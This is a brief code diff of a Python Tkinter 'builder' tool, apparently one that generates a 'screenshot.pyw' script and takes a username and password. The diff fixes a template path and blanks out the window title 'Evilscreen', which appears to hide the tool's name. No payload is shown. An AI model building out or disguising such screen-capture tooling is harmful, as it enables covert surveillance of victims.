@@ -12,7 +12,7 @@ from pathlib import Path
 window = Tk()
 
 def filemodify():
-    script_location = os.path.split(os.path.realpath(sys.argv[0]))[0] + "ok/file.txt"
+    script_location = os.path.split(os.path.realpath(sys.argv[0]))[0] + "/file.txt"
     print(script_location)
     f1 = open(script_location, 'r')
     f2 = open('screenshot.pyw', 'w')
@@ -65,7 +65,7 @@ def builder():
     global usernameentry
     global passwordentry
     window.config(background='#310E35')
-    window.title("Evilscreen - Builder")
+    window.title("       - Builder")
     frame.destroy()
     frame.pack_forget()
     window.update()
